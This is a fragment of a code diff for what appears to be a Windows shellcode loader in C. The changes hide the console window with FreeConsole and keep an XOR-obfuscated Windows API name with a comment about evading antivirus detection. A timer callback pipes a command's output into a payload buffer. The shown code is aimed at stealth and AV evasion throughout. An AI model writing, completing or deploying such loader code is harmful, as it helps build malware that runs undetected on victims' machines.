@@ -18,9 +18,10 @@ typedef struct
 
 TimerContext g_context;
 
-int main(void)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+    PSTR lpCmdLine, int nCmdShow)
 {
-
+	FreeConsole();
 	unsigned char key = 's';
 	// Further encrypt this shellcode (see if AV still identifies its as a )
 	unsigned char procName[] = "\x25\x1a\x01\x07\x06\x12\x1f\x32\x1f\x1f\x1c\x10\x73";
@@ -47,23 +48,21 @@ int main(void)
         DispatchMessage(&msg);
     }
 	KillTimer(NULL, timerId);
-		
+	
 	return 0;
 }
 
 VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
 {
+	
 	// Buffer to store one byte piped from command to shellcode buffer
 	unsigned char byte = 0;
 	int counter = 0;
 	// Check to see if results of command have failed to be piped to file storage
-	// STILL NEED TO IMPLEMENT DE_XOR TO DECRYPT COMMAND 
-	// ALso encapsulate this in the timer callback function otherwise it just has payload sitting until timer executes
 	if(NULL == (g_context.fpipe = (FILE *)popen(g_context.command, "r")))
 	{
 		exit(1);
 	}
-	
 	while (fread(&byte, sizeof(byte), 1, g_context.fpipe))
 	{
 		g_context.payload[counter] = byte;
